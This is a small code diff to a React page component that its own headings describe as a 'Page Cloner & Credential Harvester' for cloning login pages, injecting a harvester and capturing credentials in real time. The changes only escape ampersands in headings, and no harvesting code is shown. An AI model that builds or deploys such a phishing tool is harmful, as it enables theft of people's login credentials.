@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useState, useEffect, useRef } from 'react';
@@ -326,7 +325,7 @@ export default function PhishingPage() {
   return (
     <div className="flex flex-col gap-6">
       <div>
-        <h1 className="font-headline text-3xl font-semibold">Page Cloner & Credential Harvester</h1>
+        <h1 className="font-headline text-3xl font-semibold">Page Cloner &amp; Credential Harvester</h1>
         <p className="text-muted-foreground">Clone a login page, inject a harvester, and capture credentials in real-time.</p>
       </div>
 
@@ -334,7 +333,7 @@ export default function PhishingPage() {
         <div className="flex flex-col gap-6">
             <Card>
                 <CardHeader>
-                <CardTitle>Page Cloner & Harvester Setup</CardTitle>
+                <CardTitle>Page Cloner &amp; Harvester Setup</CardTitle>
                 <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                 </CardHeader>
                 <Form {...form}>
@@ -396,7 +395,7 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">Generate & Save</CardTitle>
+                        <CardTitle className="text-xl">Generate &amp; Save</CardTitle>
                         <div className="w-full flex gap-2">
                             <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                 {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
